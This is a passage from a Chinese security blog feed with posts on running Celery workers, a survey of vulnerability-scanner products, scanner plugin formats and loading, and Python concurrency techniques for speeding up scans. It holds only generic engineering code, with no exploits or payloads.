<p>另外，笔者这方面经验比较浅，欢迎运维大佬和coding大佬多多指教下这一块儿有没有其他可优化的点。</p>

<ul>
  <li>局域网调试</li>
</ul>

<p>检测网络状态，可以看出ping其他worker是通的：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; app = Celery('test', backend='redis://random_host:6379/0', broker='redis://random_host:6379/0')
&gt;&gt;&gt; app.control.ping(timeout=0.5)

[{'worker1.example.com': 'pong'},
</code></pre>
</div>

<p>查看时区差异:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; from celery.utils.timeutils import utcoffset
&gt;&gt;&gt; utcoffset()

0
</code></pre>
</div>
<p>库版本不同步等原因，可能造成worker和server的时间不同步。而且时间不同步，似乎会导致celery的超时机制不可用。</p>

<p>我们可以安装ntp服务，自动更新时间，同步server和worker的指定python库版本，示例命令如下【每个系统情况不一定适用】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install ntp
service ntp start
#手动更新时间
date -R

</code></pre>
</div>

<p>监控woker状态的一些点，可以参考这篇文章：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://fangchichen.github.io/fangchichen.github.io/2018/08/08/celery%E5%87%BA%E7%8E%B0worker%E5%BC%82%E5%B8%B8offline%E6%83%85%E5%86%B5/
</code></pre>
</div>

<ul>
  <li>celery关键配置</li>
</ul>

<p>还是那句话，各系统情况不同，
这里仅仅贴出几个关键点,大家觉得可以优化的地方可以讨论下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#任务预取功能，就是每个工作的进程／线程在获取任务的时候，会尽量多拿 n 个，以保证获取的通讯成本可以压缩。
CELERYD_PREFETCH_MULTIPLIER = 1

#这个表示每个工作的进程／线程 在执行 n 次任务后，主动销毁，之后会起一个新的，主要解决一些资源释放的问题。
CELERYD_MAX_TASKS_PER_CHILD = 1

#不存取返回结果，加快响应速度。
CELERY_IGNORE_RESULT=False

#该配置可以保证task不丢失，中断的task在下次启动时将会重新执行。
TASK_REJECT_ON_WORKER_LOST = True
#不会多拿任务，只有当worker完成了这个task时，任务才被标记为ack状态。
#只有当worker完成了这个task时，任务才被标记为ack状态
CELERY_ACKS_LATE = True

#解决时区同步问题
CELERY_TIMEZONE = 'Asia/Shanghai'
CELERY_ENABLE_UTC = True
USE_TZ = True

#broker的连接超时时间。
BROKER_CONNECTION_TIMEOUT = 20

#如果确认是因为当前worker的并发是prefork（多进程）,并且可能是由于死锁原因造成，4.0之后的版本不支持。
CELERYD_FORCE = True

#任务超时会分配给其他worker
BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 3600}

#禁用所有速度限制，如果网络资源有限，不建议开足马力。
#CELERY_DISABLE_RATE_LIMITS = True
#CELERY_ACKS_LATE = True
#CELERY_IGNORE_RESULT = True

#这个表示保存任务结果的时长，这个时间会被设置到 backend 里面
#CELERY_TASK_RESULT_EXPIRES = 3600

</code></pre>
</div>

<ul>
  <li>celery命令行参数</li>
</ul>

<p>Queue还是建议启用的，方便清空，也方便指定queuename运行特定任务。
比如配置文件里这么写:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>CELERY_QUEUES = (
            Queue('default', Exchange('default'), routing_key='default'),
            Queue('wakaka', Exchange('wakaka'), routing_key='wakaka'),
            )
</code></pre>
</div>

<p>那么，命令行可以这么输入：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>celery -A test worker -E -l INFO -n workername -Q wakaka --concurrency=4
</code></pre>
</div>

<p>注意，–concurrency的值是并发进程数，这是由你的CPU个数决定性能的，不要设太高。</p>

<p>win下的话，在高版本celery 4.x，默认的是prefork，报错解决方法如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>pip install eventlet
celery -A proj worker -l info -P eventlet

</code></pre>
</div>

<p>最后，建议大家不要在win下运行celery，似乎4.x以后某个版本已经放弃支持，而且win下有很多坑没法填。</p>

<ul>
  <li>任务调度框架</li>
</ul>

<p>关于任务调度这一块儿，除了celery，感觉dramatiq和rq的坑会少些，以后会抽空来谈谈。</p>

<h3 id="结语">结语</h3>

<p>以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[漫谈漏洞扫描]]></title>
      <url>/scanner/2018/12/27/talk-about-scanner-roads/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</strong></span>
</p>

<h3 id="企业级漏扫">企业级漏扫</h3>

<ul>
  <li>盒子扫描器</li>
</ul>

<p>对于漏扫产品的话，部分甲方单位会按公安那边的标准，在内网部署一些盒子扫描器（硬件服务器+扫描软件）。</p>

<p>说实话，这玩意儿定位是比较尴尬的，虽然大的单位每年有一定的采购指标。但是有时候还是会听产品经理吐槽，每次实在卖不出量，可能一单安全服务生意卖出个一两台就不错了。</p>

<p>当然，现在漏扫一般会配合漏洞管理、网站监控等产品一起卖。为了覆（tong）盖（hang）产（jing）品（zheng）线，给售前和销售操控的空间，这款产品还是必须要的。</p>

<p>卖漏扫盒子的利润还算可观，只要销售和渠道给力，传统乙方还是愿意做的这门生意的。</p>

<p>代表厂商有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>sangfor
venus
nsfocus
topsec
...
</code></pre>
</div>

<ul>
  <li>在线漏扫服务</li>
</ul>

<p>在线漏扫的话，一般难以对内网进行检测。大多数的操作是，在验证外网某站的所有权后，再签协议授权扫描。不过由于成本较盒子更加低廉，容易受到中小厂商的追捧。</p>

<p>当然，如果内网也需要享受这样的服务的话，自然还是需要安服人员带着盒子，或者类似封装好的扫描器，在企业单位进行驻场检测。</p>

<p>代表厂商有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>360
knownsec
...
</code></pre>
</div>
<ul>
  <li>定制漏扫</li>
</ul>

<p>据笔者所知，部分云服务厂商，会对云服务客户提供了定制漏扫服务。</p>

<p>由于是自家的服务器，自然对客户的业务具有一定的了解。无论是做漏扫，还是做资产监控还是态势感知，都是相对容易的。</p>

<p>云服务厂商在对这部分客户做漏扫时，由于统一的架构部署，安服漏扫会比较精确和有效。貌似这样的漏扫服务，一般不会对外开放，算是定制的服务。</p>

<p>顺便提一句，部分漏洞平台，好像对于大客户也推出了一条龙服务，其中是包括定制漏扫的。</p>

<p>代表云厂商有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>alibaba
tencent
kingsoft
riskivy
...
</code></pre>
</div>

<ul>
  <li>免费商业漏扫</li>
</ul>

<p>市面上也出现了部分优秀的商业级别漏扫，咱们这里先别讨论是免费版还是破解版。</p>

<p>正是有了这些漏扫产品，在驻场和分公司的苦逼兼职的安服人员，才有了一口饭吃【纯吐槽公司制度】。</p>

<p>这里解释下，因为公司内部的漏扫产品，不是分驻地都能拿到授权的，那最后怎么办呢？用破解的。效果不好咋办？换其他家的破解或者免费产品。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>AWVS
nessus
arachni
metasploit
sqlmap
burpsuite
appscan
netsparker
...
</code></pre>
</div>

<h3 id="开源漏扫">开源漏扫</h3>

<ul>
  <li>社区级漏扫</li>
</ul>

<p>这些产品一般是社区或者团队在维护的，一般为乙方渗透人员或者Bug Bounty人员所用。</p>

<p>一旦他们需要对企业机构，或者政府单位进行渗透测试时，可以根据情况，部署分布式节点扫描，加快漏扫速度。</p>

<p>笔者依稀记得曾经的bugscan，好像大家都可以接入公网节点。这听起来，其实有点像以前的迅雷p2p，可以加速所有运行的任务。</p>

<p>不过后来好像由于各种原因，部分人搞到了源码和payload包，自己玩起了单机。多台外网VPS一部署，扫起东西来也是美滋滋，亲测出结果还是比较快的。</p>

<p>不过这种漏扫有个坏处就是，一旦社区不用心再维护，渐渐就没有人再提交payload，毕竟单个漏洞的生命周期还是不长的。</p>

<p>当然，这种产品还有个去路，就是实现企业化。</p>

<p>一旦变成企业级产品，就会有更多的资源投入去维护它，自然能更好的发展下去。</p>

<p>比较可惜的是，升级后的版本以及payload，自然大多数就不会再开源了。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>bugscan
蚁逅
tangscan
Beebeeto
Pocscan
Osprey「鱼鹰」
...
</code></pre>
</div>

<ul>
  <li>综合扫描</li>
</ul>

<p>由于各种脚本语言的兴起，大幅减少了coding的难度和时间，网络上涌现出一批由团队或个人维护的综合扫描器。</p>

<p>虽然得吐槽下，大多数质量良莠不齐，造轮子的比较多，而且后续长期作者维护的比较少，不过其中不乏优秀的个体。</p>

<p>综合扫描定义比较模糊，一般除了exp检测和CMS识别外，还有部分项目加入了路径爆破、资产统计、端口扫描等功能。</p>

<p>不过让人稍稍有点失望的是，这类综合扫描可能大同小异，暂时没有发现特别亮眼的点。</p>

<p>在笔者过往的系列文章中，也谈过部分关于综合扫描器细节，这里不再细说。</p>

<p>代表产品有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>w9scan
AngelSword
fenghuangscanner
猪猪侠PPT中提过的扫描器
...
</code></pre>
</div>

<ul>
  <li>Gui扫描</li>
</ul>

<p>这里之所以单独区别于前面的综合扫描器【其实是笔者实在想不出小标题了XD】，是想谈谈其开发时间、开发难度，以及插件化难度。</p>

<p>虽然说部分Gui扫描器也实现了插件化，但作者们大多喜欢自己更新，或者只要求邮件方式提交插件。</p>

<p>这样的话，把产品生态搞成了一个近似闭环，但是肯定又远不及apple store之类的体量，导致用户主动提交的漏扫插件是比较少的。</p>

<p>当然，有部分漏扫的功能和用户体验，还是做的很不错的，很受大家追捧，笔者当年也用的很顺手。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>椰树
北极熊扫描器
k8 team系列扫描器
千手千眼佛网站扫描器
...
</code></pre>
</div>

<ul>
  <li>代理扫描器</li>
</ul>

<p>说起代理扫描器，可能内容就比较宽泛了，这里简单讲下，以后有机会单独谈谈。</p>

<p>何谓代理，中间人也，只要你能抓住中间流量，便可以作为基准去做漏洞扫描或者fuzz。</p>

<p>大家可能会想到利用抓包，利用网卡流量进行分析；有人也许会通过浏览器流量代理进行分析；还有人会通过浏览器本身提供扩展插件功能，直接对页面进行即时钩子探测。</p>

<p>说到这块儿，笔者所见的一般都是轻量级的，也可能是见识少吧。个人感觉很少有在采集存数据库以后，在离线端部署过多的exp探测任务的。</p>

<p>毕竟，这块儿也是要考虑到扫描效率，以及会话过期问题的。</p>

<p>另外，貌似代理扫描器对owasp的一些通用漏洞的fuzz，以及对敏感内容的检测，会显得多一些。对于能检测逻辑漏洞的被动扫描器，也算是比较高level的了。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ysrc的GourdScan
burpsuite插件系列
wyproxy的衍生扫描器
浏览器插件系列
...
</code></pre>
</div>

<h3 id="结语">结语</h3>

<p>笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。</p>

<p>可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈漏扫之插件篇]]></title>
      <url>/scanner/2018/10/08/scanner-plugins/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</strong></span>
</p>

<p>在本文中，我们将简单谈谈插件相关的内容。下面的示例代码依旧沿用python，但求行文精炼不赘言。</p>

<h3 id="插件的格式">插件的格式</h3>

<ul>
  <li>入口函数</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>def run():
    print 'I am the bone of my sword'
</code></pre>
</div>
<p>运行这类插件时，加载插件的入口函数run，就可以直接运行插件。</p>

<ul>
  <li>类 + 入口函数</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>class BaseVerify:

    def __init__(self, url):
        self.url = url
    
    def run(self):
        print 'I am the bone of my sword'
</code></pre>
</div>

<p>对于这种插件，在我们获取到漏洞库文件路径后，需要对服务类型进行匹配，最后再进行插件调用。
此后，我们会获得BaseVerify类的实例，再引用里面的入口函数。</p>

<p>调用方式：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>test = BaseVerify('http://www.baidu.com')
test.run()
</code></pre>
</div>

<ul>
  <li>入口函数 + 验证函数</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>def assign(service, arg):
    if service != "wordpress":
        return
    else:
        r = urlparse.urlparse(arg)
        return True, r.netloc
        
def audit(arg):
    print 'I am the bone of my sword'
        
</code></pre>
</div>
<p>这里也可以在类中引入函数，不过此处关键点在于，同时也使用了验证函数。</p>

<p>这样做的好处在于，即使不做插件目录分类，也能进行精准扫描，不至于在验证漏洞时处耗时过多。</p>

<p>不过顺便提一句，即使只运行了验证service类型的代码，在加载大量插件的情况下，也是会消耗一定的资源的。</p>

<p>调用方式(仅做参考)：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>try:
    audit( assign('www', 'http://www.baidu.com')[1] )
except:
    pass
</code></pre>
</div>

<ul>
  <li>关于插件注释</li>
</ul>

<p>在每个文件中，建议通过类属性或者直接头部注释，对每个插件进行细节标识。
不然的话，他人在复现和修改的时候，很难对代码量较大的内容进行阅读调整。当然，对于某些故意加密的插件，那就另当别论了。</p>

<h3 id="插件的加载">插件的加载</h3>

<ul>
  <li>__import__</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>plugin_path = 'plugin_dir.plugin_name'
try:
    plugin = __import__(plugin_path, fromlist=[plugin_path])
    test = getattr(plugin,'audit')
    test('http://www.baidu.com')
except Exception,e:
    print e

</code></pre>
</div>
<p>这里在获取某个插件的路径后，可转换为__import__可识别的路径格式，然后再对其入口函数audit进行引用。</p>

<ul>
  <li>importlib</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>
from importlib import import_module
plugin_path = 'plugin_dir.plugin_name'
split_dot = plugin_path.rindex('.')
module, name = plugin_path[:split_dot], plugin_path[split_dot+1:]
mod = import_module(module)
try:
    test = getattr(mod, name)
    test.audit('http://www.baidu.com')
except:
    pass

</code></pre>
</div>
<p>注意，这里的plugin_path如果不含’.’的话，可用：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from importlib import import_module
plugin_path = 'plugin_name'
test = import_module(plugin_path)
test.audit('http://www.baidu.com')

</code></pre>
</div>

<ul>
  <li>import</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>import sys
sys.path.append('plugin_dir/')
#加入系统路径plugin_dir
import plugin_name
plugin_name.audit('http://www.baidu.com')
</code></pre>
</div>

<ul>
  <li>imp</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>import imp
#这里需要正常路径名
test = imp.load_source('audit', 'plugin_dir/plugin_name.py')
test.audit('http://www.baidu.com')

</code></pre>
</div>

<ul>
  <li>导入细节的讨论</li>
</ul>

<p>笔者还见过某框架，除了导入必要的核心库文件以外，还把所有分类插件里的验证、运行等函数，也在主文件头部一股脑导入的。</p>

<p>也就是说，在每次运行框架之前，就算只是-v看版本，也会预载入所有内容。</p>

<p>而在某些框架脚本，在每次运行前会自动下载一个巨大的封装库（作者diy的），而不是把它放在requirement文件里。</p>

<p>也不是说这样一定不好，不过个人窃以为，如果想要尽可能优化框架的效率，还是不太推荐大家这么做。</p>

<h3 id="插件的存储">插件的存储</h3>

<ul>
  <li>临时加载</li>
</ul>

<p>在插件不算多的时候，我们是可以这么做的，也不会太影响效率。
比如metasploit就可以选择是否启用postgresql数据库。
如果插件都放在一个目录下，进行文件遍历即可，大概可以这样写：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>vuln_dir = 'plugin_dir/*'
vuln_paths = [f.replace('/','.') for f in glob.glob(vuln_dir)]
for vuln_path in vuln_paths:
    #vuln_path == 'plugin_dir.plugin_name'
    #下面省略
    ...
    ...
</code></pre>
</div>

<ul>
  <li>离线插件入库</li>
</ul>

<p>另外还有不少框架，是直接用数据库或者json文件存储了插件相关信息。在我们需要的时候，再查询导入储存的插件路径，进而对相应的插件进行调用。</p>

<p>当然，这样需要我们每次手动或调用update脚本，去现更新这些库。</p>

<ul>
  <li>在线核验下发</li>
</ul>

<p>如果想要再自动化一点，我们可以参考下bugscan、antoor、tangscan等社区级别的漏洞利用框架，对于插件下发的法子。</p>

<p>在贡献者上传poc，并填写好相关验证信息后，后台会有工作人员或者自动化脚本，检测该poc是否合乎官方规定的语法格式。
如果没有发现问题，脚本会生成基础信息然后入库，待做好加密打码等工作后【非必要步骤】，再供离线的框架或者框架client节点爬取更新【如有出入，当我扯淡】。</p>

<h3 id="结果的聚合">结果的聚合</h3>

<ul>
  <li>分级过滤</li>
</ul>

<p>一般在汇总数据报告时，可能会出现有的确认是漏洞，有的却是存在的敏感URL。</p>

<p>混在一起存储也不是不行，不过更好的法子是通过分级，使用单独的函数上报master，最后再进行分储和输出。</p>

<ul>
  <li>混合存储</li>
</ul>

<p>在整合网上搜集来的插件时，由于各结果的返回格式不是很好统一，有的整合型框架为了兼容会直接简单处理下，就糅合在一起存储和输出了。
其实这也没啥，只要入库的时候，将特殊字符等问题处理好，做好插件漏洞的信息粗放分类标注，那就基本OK了。</p>

<ul>
  <li>单体输出</li>
</ul>

<p>某些作者单独开发的框架，是直接省略了存储这一环节的，或者是提供了选项，默认不开启的。
这时候，插件验证如果成功，会直接把信息反馈输出到命令行里。如果在验证单体漏洞或者单个目标的时候，这样做还是比较有效率的。</p>

<h3 id="结语">结语</h3>

<p>上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈漏扫之加速篇]]></title>
      <url>/scanner/2018/09/03/scanner-faster/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</strong></span>
</p>

<p>为了方便描述，笔者这里会拿python的库来举例，部分代码采集自网络。本文会向大家简要评析一些能加快扫描速率的库。希望借此帮大家规避掉一些坑，很多点也是具有普适性的。</p>

<h3 id="线程">线程</h3>

<h4 id="多线程">多线程</h4>

<p>示例：</p>

<ul>
  <li>threading</li>
</ul>

<p>用法比较简单，普通速成小脚本建议用这个库，比如在扫描主机存活或者探测URL路径是否存在的时候。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#coding:utf-8
import threading
import time

def action(arg):
    time.sleep(1)
    print  'sub thread start!the thread name is:%s    ' % threading.currentThread().getName()
    print 'the arg is:%s   ' %arg
    time.sleep(1)


for i in xrange(4):
    t =threading.Thread(target=action,args=(i,))
    t.setDaemon(True)
    t.start()
    t.join()

print 'main_thread end!'
</code></pre>
</div>

<ul>
  <li>thread</li>
</ul>

<p>有的朋友可能会问，有没有更简单的，老夫不懂那么多，只想一把梭！
当然有，很早以前笔者也曾喜欢使用这个库：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#coding=gbk
import thread, time, random
count = 0
def threadTest():
    global count
    for i in xrange(10000):
        count += 1
for i in range(10):
    thread.start_new_thread(threadTest, ())	
time.sleep(3)
print count	
</code></pre>
</div>

<p>不过thread.start_new_thread有个比较明显的缺点，因为起了新线程是不好控制的，一旦任务挂起过多，会占用较多的机器资源，所以建议在检测目标量不大的时候使用。</p>

<h4 id="线程池">线程池</h4>

<ul>
  <li>threadpool</li>
</ul>

<p>说实在这库还是比较好用的，在无序输出结果等情况下比较稳健，尤其是它在win平台下兼容性是比较好的。
不过需要注意，就是如果不加锁的话，需要先做数据聚合。直接按序写入文件，或者直接入库的话，数据会乱掉。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>import time
import threadpool  
def sayhello(str):
    print "Hello ",str
    time.sleep(2)

name_list =['xiaozi','aa','bb','cc']
start_time = time.time()
pool = threadpool.ThreadPool(10) 
requests = threadpool.makeRequests(sayhello, name_list) 
[pool.putRequest(req) for req in requests] 
pool.wait() 
print '%d second'% (time.time()-start_time)
</code></pre>
</div>

<ul>
  <li>concurrent.futures</li>
</ul>

<p>该库是python 3.x自带的，但python 2.x也能用，相对来说会比threadpool更优化的多一些，毕竟新库嘛。</p>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="c"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">sayhello</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"hello: "</span><span class="o">+</span><span class="n">a</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">seed</span><span class="o">=</span><span class="p">[</span><span class="s">"a"</span><span class="p">,</span><span class="s">"b"</span><span class="p">,</span><span class="s">"c"</span><span class="p">]</span>
    <span class="n">start1</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">seed</span><span class="p">:</span>
        <span class="n">sayhello</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
    <span class="n">end1</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"time1: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end1</span><span class="o">-</span><span class="n">start1</span><span class="p">))</span>
    <span class="c">#submit提交</span>
    <span class="n">start2</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">seed</span><span class="p">:</span>
            <span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">sayhello</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
    <span class="n">end2</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"time2: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end2</span><span class="o">-</span><span class="n">start2</span><span class="p">))</span>
    <span class="c">#map提交</span>
    <span class="n">start3</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor1</span><span class="p">:</span>
        <span class="n">executor1</span><span class="o">.</span><span class="nb">map</span><span class="p">(</span><span class="n">sayhello</span><span class="p">,</span><span class="n">seed</span><span class="p">)</span>
    <span class="n">end3</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"time3: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end3</span><span class="o">-</span><span class="n">start3</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</code></pre>
</div>

<p>我们可以看看上面的代码注释，其中submit和map的区别在于：</p>

<blockquote>
  <ol>
    <li>map可以保证输出的顺序, submit输出的顺序是乱的。</li>
  </ol>
</blockquote>

<blockquote>
  <ol>
    <li>如果你要提交的任务的函数是一样的，就可以简化成map。但是假如提交的任务函数是不一样的，或者执行的过程之可能出现异常（使用map执行过程中发现问题会直接抛出错误）就要用到submit。</li>
  </ol>
</blockquote>

<blockquote>
  <ol>
    <li>submit和map的参数是不同的，submit每次都需要提交一个目标函数和对应的参数，map只需要提交一次目标函数，目标函数的参数放在一个迭代器（列表，字典）里就可以。</li>
  </ol>
</blockquote>

<h3 id="协程">协程</h3>

<p>协程算是一种用户级别的轻量级线程，调度较线程会麻烦一些，但因为开销减少提升了性能。</p>

<ul>
  <li>gevent</li>
</ul>

<p>这个就是熟面孔了，许多经典爬虫都会用到这个库，在linux下贼好用的。不过因为依赖库的问题，让它在win下总是出现greenlet等库的版本和依赖问题。</p>

<p>不过比之线程池的threadpool，这个不加锁时也不用担心乱序问题。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
import requestss

def detect(url):
    try:
        r = requests.get(url,  headers= headers ,timeout = timeout ,verify = False)
    except Exception,e:
        return

pool = Pool(20)#协程数
pool.map(detect, urls)
[pool.putRequest(req) for req in reqs]
pool.wait()

</code></pre>
</div>

<ul>
  <li>其他协程库</li>
</ul>

<p>另外，其他实现协程的库还是蛮多的，这里不方便列举，有兴趣的朋友可以搜搜。</p>

<ol>
  <li>asyncio</li>
  <li>tornado</li>
</ol>

<h3 id="进程">进程</h3>

<p>进程间的切换，会消耗较多的资源和时间，一般会配合多线程/协程使用，叠加对任务进行分发。</p>

<p>下面我们来看几个案例：</p>

<h4 id="多进程">多进程</h4>

<ul>
  <li>fork</li>
</ul>

<p>教科书式的的案例，曾收录在不少经典编程书籍里：</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/bin/env python</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">print</span> <span class="s">'Process (</span><span class="si">%</span><span class="s">s) start...'</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">()</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
<span class="k">if</span> <span class="n">pid</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'I am child process (</span><span class="si">%</span><span class="s">s) and my parent is </span><span class="si">%</span><span class="s">s.'</span> <span class="o">%</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">os</span><span class="o">.</span><span class="n">getppid</span><span class="p">())</span>
    <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'I (</span><span class="si">%</span><span class="s">s) just created a child process (</span><span class="si">%</span><span class="s">s).'</span> <span class="o">%</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">pid</span><span class="p">)</span>
</code></pre>
</div>

<ul>
  <li>multiprocessing的多进程</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/bin/env python</span>
<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Process</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">run_proc</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Run child process </span><span class="si">%</span><span class="s">s (</span><span class="si">%</span><span class="s">s)...'</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">())</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'Parent process </span><span class="si">%</span><span class="s">s.'</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">()</span>
    <span class="n">processes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_proc</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="s">'test'</span><span class="p">,))</span>
        <span class="k">print</span> <span class="s">'Process will start.'</span>
        <span class="n">p</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="n">processes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">processes</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
    <span class="k">print</span> <span class="s">'Process end.'</span>

</code></pre>
</div>

<ul>
  <li>multiprocessing下的多线程</li>
</ul>

<p>在multiprocessing下也有个多线程模块,通过async_result.get()可以获取结果。</p>

<p>multiprocessing也能实现多线程，它有两个多线程的入口，一个是 dummy Pool：</p>

